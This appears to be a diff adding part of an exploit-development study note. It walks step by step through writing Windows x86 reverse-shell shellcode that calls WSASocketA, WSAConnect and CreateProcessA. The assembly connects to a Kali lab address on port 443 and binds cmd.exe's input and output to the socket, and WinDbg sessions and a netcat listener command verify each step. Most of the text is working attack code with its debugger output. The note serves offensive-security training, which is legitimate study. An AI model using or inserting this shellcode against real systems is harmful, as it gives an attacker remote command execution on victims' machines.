+    "   xor   eax, eax                  ;"  #   Null EAX
+    "   push  eax                       ;"  #   Push dwFlags
+    "   push  eax                       ;"  #   Push g
+    "   push  eax                       ;"  #   Push lpProtocolInfo
+    "   mov   al, 0x06                  ;"  #   Move AL, IPPROTO_TCP
+    "   push  eax                       ;"  #   Push protocol
+    "   sub   al, 0x05                  ;"  #   Subtract 0x05 from AL, AL = 0x01
+    "   push  eax                       ;"  #   Push type
+    "   inc   eax                       ;"  #   Increase EAX, EAX = 0x02
+    "   push  eax                       ;"  #   Push af
+    "   call dword ptr [ebp+0x20]       ;"  #   Call WSASocketA
+```
+
+Set a breakpoint on the CALL to `WSASocketA`.
+
+`bp 02a500f8`
+
+`g`
+
+```
+Breakpoint 0 hit
+02a500f8 ff5520          call    dword ptr [ebp+20h]  ss:0023:02c4fe58={WS2_32!WSASocketA (750856d0)}
+```
+
+`dds @esp L6`
+
+```
+02c4f9ec  00000002
+02c4f9f0  00000001
+02c4f9f4  00000006
+02c4f9f8  00000000
+02c4f9fc  00000000
+02c4fa00  00000000
+```
+
+`p`
+
+```
+ModLoad: 73af0000 73b40000   C:\Windows\system32\mswsock.dll
+eax=00000180
+02a500fb 0000            add     byte ptr [eax],al          ds:0023:00000180=??
+```
+
+The return value from is `0x180`.
+
+If the call is unsuccessful, the return value is `INVALID_SOCKET` (`0xFFFF`). Otherwise, the function returns a descriptor referencing the socket.
+
+We have now successfully created a socket by calling the WSASocketA API and obtained a descriptor referencing it in the EAX register.
+
+### Calling WSAConnect
+
+With our socket created, call `WSAConnect`, which establishes a connection between 2 socket applications.
+
+```C
+int WSAAPI WSAConnect(
+  SOCKET         s,
+  const sockaddr *name,
+  int            namelen,
+  LPWSABUF       lpCallerData,
+  LPWSABUF       lpCalleeData,
+  LPQOS          lpSQOS,
+  LPQOS          lpGQOS
+);
+```
+
+The 1st parameter is the `SOCKET` type, simply named `s`. This parameter requires a descriptor to an unconnected socket, which is exactly what the previous call to `WSASocketA` returned in the `EAX` register.
+
+The 2nd parameter, a pointer to a `sockaddr` structure. This structure varies depending on the protocol selected. For the IPv4 protocol, use the `sockaddr_in` structure:
+
+```C
+typedef struct sockaddr_in {
+#if ...
+  short          sin_family;
+#else
+  ADDRESS_FAMILY sin_family;
+#endif
+  USHORT         sin_port;
+  IN_ADDR        sin_addr;
+  CHAR           sin_zero[8];
+} SOCKADDR_IN, *PSOCKADDR_IN;
+```
+
+- The 1st member is `sin_family`, which requires the address family of the transport address. Ensure this value is always set to `AF_INET`.
+
+- The next member is `sin_port`, which as the name implies, specifies the port.
+
+- This is followed by `sin_addr`, a nested structure of the type `IN_ADDR`. This nested structure will store the IP address used to initiate the connection to. We can store the IP address inside a DWORD.
+
+```C
+typedef struct in_addr {
+  union {
+    struct {
+      UCHAR s_b1;
+      UCHAR s_b2;
+      UCHAR s_b3;
+      UCHAR s_b4;
+    } S_un_b;
+    struct {
+      USHORT s_w1;
+      USHORT s_w2;
+    } S_un_w;
+    ULONG  S_addr;
+  } S_un;
+} IN_ADDR, *PIN_ADDR, *LPIN_ADDR;
+```
+
+The last member of the `sockaddr_in` structure is `sin_zero`, a size 8 character array. According to the official documentation, this array is reserved for system use, and its contents should be set to `0`.
+
+The `WSAConnect` prototype:
+
+```C
+int WSAAPI WSAConnect(
+  SOCKET         s,
+  const sockaddr *name,
+  int            namelen,
+  LPWSABUF       lpCallerData,
+  LPWSABUF       lpCalleeData,
+  LPQOS          lpSQOS,
+  LPQOS          lpGQOS
+);
+```
+
+- The `*name` parameter is a pointer to the `sockaddr_in` structure
+
+- The size of the previously-passed structure as the `namelen` parameter. The size of `sockaddr_in` is `0x10` bytes long.
+
+- `lpCallerData` and `lpCalleeData`, require pointers to user data that will be transferred to and from the other socket. According to the documentation, these parameters are used by legacy protocols and are not supported for TCP/IP. We can set both of these to be `NULL`.
+
+- The `lpSQOS` parameter requires a pointer to the `FLOWSPEC` structure. This structure is used in applications that support quality of service (QoS)6 parameters. This is not the case for our shellcode, so we can set it to `NULL`.
+
+- The `lpGQOS` parameter is reserved and should be set to `NULL`.
+
+Convert the IP address and the port of our Kali machine to the correct format.
+
+`? 0n192`
+
+```
+Evaluate expression: 192 = 000000c0
+```
+
+`? 0n168`
+
+```
+Evaluate expression: 168 = 000000a8
+```
+
+`? 0n119`
+
+```
+Evaluate expression: 119 = 00000077
+```
+
+`? 0n120`
+
+```
+Evaluate expression: 120 = 00000078
+```
+
+`? 0n443`
+
+```
+Evaluate expression: 443 = 000001bb
+```
+
+With the hex values of our IP address and port generated, update our shellcode with the call to the `WSAConnect` API:
+
+```python
+    " call_wsaconnect:                   "  #
+    "   mov   esi, eax                  ;"  #   Move the SOCKET descriptor to ESI
+    "   xor   eax, eax                  ;"  #   Null EAX
+    "   push  eax                       ;"  #   Push sin_zero[]
+    "   push  eax                       ;"  #   Push sin_zero[]
+    "   push  0x7877a8c0                ;"  #   Push sin_addr (192.168.119.120)
+    "   mov   ax, 0xbb01                ;"  #   Move the sin_port (443) to AX
+    "   shl   eax, 0x10                 ;"  #   Left shift EAX by 0x10 bits
+    "   add   ax, 0x02                  ;"  #   Add 0x02 (AF_INET) to AX
+    "   push  eax                       ;"  #   Push sin_port & sin_family
+    "   push  esp                       ;"  #   Push pointer to the sockaddr_in structure
+    "   pop   edi                       ;"  #   Store pointer to sockaddr_in in EDI
+    "   xor   eax, eax                  ;"  #   Null EAX
+    "   push  eax                       ;"  #   Push lpGQOS
+    "   push  eax                       ;"  #   Push lpSQOS
+    "   push  eax                       ;"  #   Push lpCalleeData
+    "   push  eax                       ;"  #   Push lpCallerData
+    "   add   al, 0x10                  ;"  #   Set AL to 0x10
+    "   push  eax                       ;"  #   Push namelen
+    "   push  edi                       ;"  #   Push *name
+    "   push  esi                       ;"  #   Push s
+    "   call dword ptr [ebp+0x24]       ;"  #   Call WSAConnect
+```
+
+The `call_wsaconnect` function starts by saving the socket descriptor to `ESI`.
+
+Using the `SHL` instruction, left-shift the `EAX` value by `0x10` bits and then add `0x02` to the `AX` register. This is done because both the `sin_port` and `sin_family` members are defined as `USHORT`, meaning they are each 2 bytes long. Then we will push the resulting DWORD to the stack, completing the `sockaddr_in` structure. Next, we obtain a pointer to it using the PUSH ESP and POP EDI instructions to use later.
+
+Finally, we push the pointer to the `sockaddr_in` structure, stored in `EDI`, and the socket descriptor from `ESI`.
+
+After all the arguments have been pushed on the stack, we call the API.
+
+Set a breakpoint at the call to `WSAConnect`, and inspect the arguments we pass.
+
+`bp 0235011f`
+
+`g`
+
+```
+0235011f ff5524          call    dword ptr [ebp+24h]  ss:0023:0254fd38={WS2_32!WSAConnect (75084d90)}
+```
+
+`dds @esp L7`
+
+```
+0254f8b4  00000180
+0254f8b8  0254f8d0
+0254f8bc  00000010
+0254f8c0  00000000
+0254f8c4  00000000
+0254f8c8  00000000
+0254f8cc  00000000
+```
+
+`dds 0254f8d0 L4`
+
+```
+0254f8d0  bb010002
+0254f8d4  7877a8c0
+0254f8d8  00000000
+0254f8dc  00000000
+```
+
+We have successfully created the `sockaddr_in` on the stack, and passed the pointer to it as a parameter to `WSAConnect`. The rest of the parameters also seem to have been pushed onto the stack correctly.
+
+### Calling CreateProcessA
+
+Now that we have successfully initiated a connection, find a way to start a `cmd.exe` process and redirect its input and output through our initiated connection.
+
+Use the `CreateProcessA` API to, as its name suggests, create a new process.
+
+```C
+BOOL CreateProcessA(
+  LPCSTR                lpApplicationName,
+  LPSTR                 lpCommandLine,
+  LPSECURITY_ATTRIBUTES lpProcessAttributes,
+  LPSECURITY_ATTRIBUTES lpThreadAttributes,
+  BOOL                  bInheritHandles,
+  DWORD                 dwCreationFlags,
+  LPVOID                lpEnvironment,
+  LPCSTR                lpCurrentDirectory,
+  LPSTARTUPINFOA        lpStartupInfo,
+  LPPROCESS_INFORMATION lpProcessInformation
+);
+```
+
+- `lpApplicationName` parameter must contain a pointer to a string, which represents the application that will be executed. If the parameter is set to `NULL`, the second parameter (`lpCommandLine`) can not be `NULL`, and vice-versa.
+
+This parameter expects a pointer to a string containing the command line to be executed. Our shellcode will use this parameter to run `cmd.exe`.
+
+- The `lpProcessAttributes` and `lpThreadAttributes` parameters, which require pointers to `SECURITY_ATTRIBUTES` type structures. For our shellcode, these parameters can be set to `NULL`.
+
+The following parameter, `bInheritHandles`, expects a `TRUE` (`1`) or `FALSE` (`0`) value. This value determines if the inheritable handles from the Python calling process are inherited by the new process (`cmd.exe`). We'll need to set this value to `TRUE` for our reverse shell.
+
+`bInheritHandles` is followed by the `dwCreationFlags` parameter, which expects various `Process Creation Flags`. If this value is `NULL`, the `cmd.exe` process will use the same flags as the calling process.
+
+The `lpEnvironment` parameter expects a pointer to an environment block. The official documentation indicates that if this parameter is set to `NULL`, it will share the same environment block as the calling process.
+
+`lpCurrentDirectory` allows us to specify the full path to the directory for the process. If we set it to `NULL`, it will use the same path as the current calling process. In our case, `cmd.exe` is added to the PATH, allowing us to launch the executable from any path. However, depending on which process the shellcode runs, this parameter might be required.
+
+The last 2 parameters, `lpStartupInfo` and `lpProcessInformation`, require pointers to `STARTUPINFOA` and `PROCESS_INFORMATION` structures.
+
+Because the `PROCESS_INFORMATION` structure will be populated as part of the API, we only need to know the size of the structure.
+
+On the other hand, the `STARTUPINFOA` structure has to be passed to the API by our shellcode.
+
+```C
+typedef struct _STARTUPINFOA {
+  DWORD  cb;
+  LPSTR  lpReserved;
+  LPSTR  lpDesktop;
+  LPSTR  lpTitle;
+  DWORD  dwX;
+  DWORD  dwY;
+  DWORD  dwXSize;
+  DWORD  dwYSize;
+  DWORD  dwXCountChars;
+  DWORD  dwYCountChars;
+  DWORD  dwFillAttribute;
+  DWORD  dwFlags;
+  WORD   wShowWindow;
+  WORD   cbReserved2;
+  LPBYTE lpReserved2;
+  HANDLE hStdInput;
+  HANDLE hStdOutput;
+  HANDLE hStdError;
+} STARTUPINFOA, *LPSTARTUPINFOA;
+```
+
+We only have to worry about a few members. We can set the remaining members to `NULL`.
+
+The first member is `cb`, which requires the size of the structure. We can easily calculate this value using its publicly available symbols and WinDbg:
+
+`dt STARTUPINFOA`
+
+```
+MSVCR120!STARTUPINFOA
+   +0x000 cb               : Uint4B
+   +0x004 lpReserved       : Ptr32 Char
+   +0x008 lpDesktop        : Ptr32 Char
+   +0x00c lpTitle          : Ptr32 Char
+   +0x010 dwX              : Uint4B
+   +0x014 dwY              : Uint4B
+   +0x018 dwXSize          : Uint4B
+   +0x01c dwYSize          : Uint4B
+   +0x020 dwXCountChars    : Uint4B
+   +0x024 dwYCountChars    : Uint4B
+   +0x028 dwFillAttribute  : Uint4B
+   +0x02c dwFlags          : Uint4B
+   +0x030 wShowWindow      : Uint2B
+   +0x032 cbReserved2      : Uint2B
+   +0x034 lpReserved2      : Ptr32 UChar
+   +0x038 hStdInput        : Ptr32 Void
+   +0x03c hStdOutput       : Ptr32 Void
+   +0x040 hStdError        : Ptr32 Void
+```
+
+`?? sizeof(STARTUPINFOA)`
+
+```
+unsigned int 0x44
+```
+
+The 2nd member is `dwFlags`. It determines whether certain members of the `STARTUPINFOA` structure are used when the process creates a window. We'll need to set this member to the `STARTF_USESTDHANDLES` flag to enable the `hStdInput`, `hStdOutput`, and `hStdError` members.
+
+It is worth mentioning that if this flag is specified, the handles of the calling process must be inheritable, and the `bInheritHandles` parameter must be set to `TRUE`.
+
+Because we will set the `STARTF_USESTDHANDLES` flag, we also need to set the members that this flag enables. The official documentation tells us that all of these members accept a handle, which receives input (`hStdInput`), output (`hStdOutput`), and error handling (`hStdError`). To interact with the `cmd.exe` process through our socket, we can specify the socket descriptor obtained from the WSASocketA API call as a handle.
+
+```python
+    " create_startupinfoa:               "  #
+    "   push  esi                       ;"  #   Push hStdError
+    "   push  esi                       ;"  #   Push hStdOutput
+    "   push  esi                       ;"  #   Push hStdInput
+    "   xor   eax, eax                  ;"  #   Null EAX   
+    "   push  eax                       ;"  #   Push lpReserved2
+    "   push  eax                       ;"  #   Push cbReserved2 & wShowWindow
+    "   mov   al, 0x80                  ;"  #   Move 0x80 to AL
+    "   xor   ecx, ecx                  ;"  #   Null ECX
+    "   mov   cx, 0x80                  ;"  #   Move 0x80 to CX
+    "   add   eax, ecx                  ;"  #   Set EAX to 0x100
+    "   push  eax                       ;"  #   Push dwFlags
+    "   xor   eax, eax                  ;"  #   Null EAX   
+    "   push  eax                       ;"  #   Push dwFillAttribute
+    "   push  eax                       ;"  #   Push dwYCountChars
+    "   push  eax                       ;"  #   Push dwXCountChars
+    "   push  eax                       ;"  #   Push dwYSize
+    "   push  eax                       ;"  #   Push dwXSize
+    "   push  eax                       ;"  #   Push dwY
+    "   push  eax                       ;"  #   Push dwX
+    "   push  eax                       ;"  #   Push lpTitle
+    "   push  eax                       ;"  #   Push lpDesktop
+    "   push  eax                       ;"  #   Push lpReserved
+    "   mov   al, 0x44                  ;"  #   Move 0x44 to AL
+    "   push  eax                       ;"  #   Push cb
+    "   push  esp                       ;"  #   Push pointer to the STARTUPINFOA structure
+    "   pop   edi                       ;"  #   Store pointer to STARTUPINFOA in EDI
+```
+
+The `create_startupinfoa` function is responsible for creating the `STARTUPINFOA` and obtaining a pointer to it for later use.
+
+Next, we push the ESI register, which currently holds our socket descriptor, to the stack three times. This sets the hStdInput, hStdOutput, and hStdError members.
+
+This instruction is followed by pushing two NULL DWORDS setting the lpReserved2, cbReserved2, and wShowWindow members.
+
+Continuing the logic of our function, we set both the AL and CX registers to 0x80, and then add them together, storing the result in EAX. This value is then pushed as the dwFlags member.
+
+The only other parameter not set to NULL is cb, which is set to the structure size (0x44).
+
+As a final step in the create_startupinfoa function, we push the ESP register, which gives us a pointer to the STARTUPINFOA structure on the stack. We then POP that value into EDI.
+
+The next step is to store the "cmd.exe" string and obtain a pointer to it. The assembly instructions required to do that are shown below:
+
+```python
+    " create_cmd_string:                 "  #
+    "   mov   eax, 0xff9a879b           ;"  #   Move 0xff9a879b into EAX
+    "   neg   eax                       ;"  #   Negate EAX, EAX = 00657865
+    "   push  eax                       ;"  #   Push part of the "cmd.exe" string
+    "   push  0x2e646d63                ;"  #   Push the remainder of the "cmd.exe" string
+    "   push  esp                       ;"  #   Push pointer to the "cmd.exe" string
+    "   pop   ebx                       ;"  #   Store pointer to the "cmd.exe" string in EBX
+```
+
+The assembly instructions from Listing 84 start by moving a negative value into EAX. This instruction is followed by a `NEG` instruction, which will result in the last part of the string including the NULL string terminator. This instruction allows us to avoid the NULL byte in our shellcode.
+
+Finally, we push the rest of the "cmd.exe" string to the stack, and obtain a pointer to it in `EBX` to use later.
+
+Now that we have the `STARTUPINFOA` structure and "cmd.exe" string ready, it's time to set up the arguments and call the function:
+
+```python
+    " call_createprocessa:               "  #
+    "   mov   eax, esp                  ;"  #   Move ESP to EAX
+    "   xor   ecx, ecx                  ;"  #   Null ECX
+    "   mov   cx, 0x390                 ;"  #   Move 0x390 to CX
+    "   sub   eax, ecx                  ;"  #   Subtract CX from EAX to avoid overwriting the structure later
+    "   push  eax                       ;"  #   Push lpProcessInformation
+    "   push  edi                       ;"  #   Push lpStartupInfo
+    "   xor   eax, eax                  ;"  #   Null EAX   
+    "   push  eax                       ;"  #   Push lpCurrentDirectory
+    "   push  eax                       ;"  #   Push lpEnvironment
+    "   push  eax                       ;"  #   Push dwCreationFlags
+    "   inc   eax                       ;"  #   Increase EAX, EAX = 0x01 (TRUE)
+    "   push  eax                       ;"  #   Push bInheritHandles
+    "   dec   eax                       ;"  #   Null EAX
+    "   push  eax                       ;"  #   Push lpThreadAttributes
+    "   push  eax                       ;"  #   Push lpProcessAttributes
+    "   push  ebx                       ;"  #   Push lpCommandLine
+    "   push  eax                       ;"  #   Push lpApplicationName
+    "   call dword ptr [ebp+0x18]       ;"  #   Call CreateProcessA
+```
+
+The call_createprocessa function starts by moving the ESP register to EAX and subtracting 0x390 from it with the help of ECX. This is the same step we took when calling the WSAStartup API, which populated the WSADATA structure. This time, we are using this memory address to store the PROCESS_INFORMATION structure, which will be populated by the API.
+Next, we push a pointer to the STARTUPINFOA structure that we previously stored in EDI. This instruction is followed by three NULL DWORDs, setting the next three arguments.
+
+We then increase EAX, making the register contain the value 0x01 (TRUE), and push it as the bInheritHandles argument. Then we decrease the register, setting it back to NULL, and push two NULL DWORDs.
+
+The lpCommandLine, which requires a pointer to a string representing the command to be executed, is pushed on the stack using the EBX register set in a previous step. Finally, we set the lpApplicationName argument to NULL and call the API.
+
+Let's run our updated shellcode and verify the return value of CreateProcessA inside WinDbg by setting a breakpoint right at the call instruction.
+
+Restart our Netcat listener on the Kali machine.
+
+```bash
+nc -lvp 443
+```
+
+`bp 0294016c`
+
+`g`
+
+```
+0294016c ff5518          call    dword ptr [ebp+18h]  ss:0023:02b3f7ac={KERNEL32!CreateProcessAStub (76e68d80)}
+```
+
+`p`
+
+```
+eax=00000001 ebx=02b3f304 ecx=74517fd6 edx=00000000 esi=00000180 edi=02b3f30c
+eip=0294016f esp=02b3f304 ebp=02b3f794 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+0294016f 0000            add     byte ptr [eax],al          ds:0023:00000001=??
+```
+
+The return value we got is not `NULL`. This indicates that the call was successful.
+
 # Reverse Engineering for Bugs
 
 
